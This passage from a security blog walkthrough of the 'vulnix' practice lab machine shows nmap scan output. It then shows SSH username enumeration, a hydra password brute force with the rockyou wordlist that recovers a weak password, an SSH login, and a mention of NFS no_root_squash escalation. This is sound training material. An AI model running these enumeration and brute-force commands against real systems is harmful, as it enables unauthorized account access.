</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2022-08-31T17:40:12
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   58e3:f1ac:fef6:b6d1:744c:836f:ba24:4f0a
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 712f:69ba:8c54:32e5:711c:898b:55ab:0a83:44a0:420b
</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-25T13:21:20+00:00<span class="p">;</span> +3s from scanner time.
</span></span><span class="line"><span class="cl">79/tcp    open  finger     Linux fingerd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_finger: No one logged on.<span class="se">\x</span>0D
</span></span><span class="line"><span class="cl">110/tcp   open  pop3?
</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: PIPELINING CAPA TOP STLS SASL RESP-CODES UIDL
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2012-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2022-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-25T13:21:20+00:00<span class="p">;</span> +3s from scanner time.
</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind    2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> rpcinfo: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   program version    port/proto  service
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp   nfs
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp6  nfs
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp   nfs
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp6  nfs
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3      33717/udp   mountd
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3      44535/tcp6  mountd
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3      50944/udp6  mountd
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3      53510/tcp   mountd
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,3,4      43297/udp6  nlockmgr
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,3,4      43584/udp   nlockmgr
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,3,4      58082/tcp6  nlockmgr
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,3,4      58548/tcp   nlockmgr
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44406/tcp6  status
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp   nfs_acl
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp6  nfs_acl
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/udp   nfs_acl
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">100227</span>  2,3         2049/udp6  nfs_acl
</span></span><span class="line"><span class="cl">143/tcp   open  imap       Dovecot imapd
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2012-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2022-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: more have STARTTLS ENABLE listed post-login capabilities IMAP4rev1 LITERAL+ LOGINDISABLEDA0001 LOGIN-REFERRALS OK Pre-login IDLE SASL-IR ID
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-25T13:21:20+00:00<span class="p">;</span> +3s from scanner time.
</span></span><span class="line"><span class="cl">512/tcp   open  exec?
</span></span><span class="line"><span class="cl">513/tcp   open  login
</span></span><span class="line"><span class="cl">514/tcp   open  tcpwrapped
</span></span><span class="line"><span class="cl">993/tcp   open  ssl/imap   Dovecot imapd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-25T13:21:19+00:00<span class="p">;</span> +2s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: more have ENABLE listed post-login capabilities IMAP4rev1 LITERAL+ ID SASL-IR OK Pre-login IDLE <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001 LOGIN-REFERRALS
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2012-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2022-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
</span></span><span class="line"><span class="cl">995/tcp   open  ssl/pop3s?
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-25T13:21:20+00:00<span class="p">;</span> +3s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: PIPELINING CAPA TOP USER SASL<span class="o">(</span>PLAIN<span class="o">)</span> RESP-CODES UIDL
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2012-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2022-09-02T17:40:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
</span></span><span class="line"><span class="cl">2049/tcp  open  nfs        2-4 <span class="o">(</span>RPC <span class="c1">#100003)</span>
</span></span><span class="line"><span class="cl">41889/tcp open  status     <span class="m">1</span> <span class="o">(</span>RPC <span class="c1">#100024)</span>
</span></span><span class="line"><span class="cl">49007/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
</span></span><span class="line"><span class="cl">53510/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
</span></span><span class="line"><span class="cl">58548/tcp open  nlockmgr   1-4 <span class="o">(</span>RPC <span class="c1">#100021)</span>
</span></span><span class="line"><span class="cl">59542/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
</span></span><span class="line"><span class="cl">Service Info: Host:  vulnix<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2s, deviation: 0s, median: 2s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sun Aug 25 14:21:18 2024 -- 1 IP address (1 host up) scanned in 189.88 seconds</span>
</span></span></code></pre></div><ul>
<li>Used the wordlist from <a href="https://github.com/W-GOULD/ssh-user-enumeration">here</a> and the original tool from <a href="https://github.com/nccgroup/ssh_user_enum">here</a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ python2 ssh_enum.py -u ../ssh-user-enumeration/wordlist.txt -i 192.168.0.131
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Starting username <span class="nv">enumeration</span>
</span></span><span class="line"><span class="cl"><span class="o">====================</span>
</span></span><span class="line"><span class="cl">User root took 17.0 seconds
</span></span><span class="line"><span class="cl">User root exists
</span></span><span class="line"><span class="cl">User admin took 1.0 seconds
</span></span><span class="line"><span class="cl">User user took 18.0 seconds
</span></span><span class="line"><span class="cl">User user exists
</span></span><span class="line"><span class="cl">User <span class="nb">test</span> took 2.0 seconds
</span></span><span class="line"><span class="cl">User guest took 2.0 seconds
</span></span><span class="line"><span class="cl">User ubuntu took 2.0 seconds
</span></span><span class="line"><span class="cl">User kali took 2.0 seconds
</span></span><span class="line"><span class="cl">User john took 2.0 seconds
</span></span><span class="line"><span class="cl">User jane took 2.0 seconds
</span></span><span class="line"><span class="cl">User smith took 2.0 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The following users were valid <span class="o">(</span>settings were - multiplier of <span class="m">20000</span> and a threshold of 14:
</span></span><span class="line"><span class="cl"><span class="o">===========================</span>
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">user
</span></span></code></pre></div><p>We can then attempt to brute force SSH with the username we have at hand. which was successful.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.131 -v
</span></span><span class="line"><span class="cl">--SNIP--
</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.0.131   login: user   password: letmein
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> attack finished <span class="k">for</span> 192.168.0.131 <span class="o">(</span>waiting <span class="k">for</span> children to <span class="nb">complete</span> tests<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 2049199.86 tries/min, <span class="m">14344399</span> tries in 00:07h, <span class="m">6</span> to <span class="k">do</span> in 00:01h, <span class="m">9</span> active
</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span></span></code></pre></div><p>Got the password and logged in via SSH as the user in which password was cracked for.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ ssh user@192.168.0.131
</span></span><span class="line"><span class="cl">user@192.168.0.131<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 12.04.1 LTS <span class="o">(</span>GNU/Linux 3.2.0-29-generic-pae i686<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Sun Aug <span class="m">25</span> 21:57:25 BST <span class="m">2024</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.06             Processes:           <span class="m">95</span>
</span></span><span class="line"><span class="cl">  Usage of /:   90.2% of 773MB   Users logged in:     <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 7%               IP address <span class="k">for</span> eth0: 192.168.0.131
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">=</span>&gt; / is using 90.2% of 773MB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Graph this data and manage this system at https://landscape.canonical.com/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user@vulnix:~$ whoami
</span></span><span class="line"><span class="cl">user
</span></span></code></pre></div><p>There is a way to privilege escalate by abusing the &ldquo;<em><strong>no_root_squash</strong></em>&rdquo; privileges on NFS but i think the machine has a problem and that would be all for now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@vulnix:/tmp$ cat /etc/exports
</span></span><span class="line"><span class="cl"><span class="c1"># /etc/exports: the access control list for filesystems which may be exported</span>
</span></span><span class="line"><span class="cl"><span class="c1">#               to NFS clients.  See exports(5).</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Example for NFSv2 and NFSv3:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Example for NFSv4:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">/home/vulnix    *<span class="o">(</span>rw,root_squash<span class="o">)</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="next" href="http://localhost:1313/hacking/nara/">
    <span class="title">Next ¬ª</span>
    <br>
    <span>Nara || PG Practice</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="http://localhost:1313/">SecFortess</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
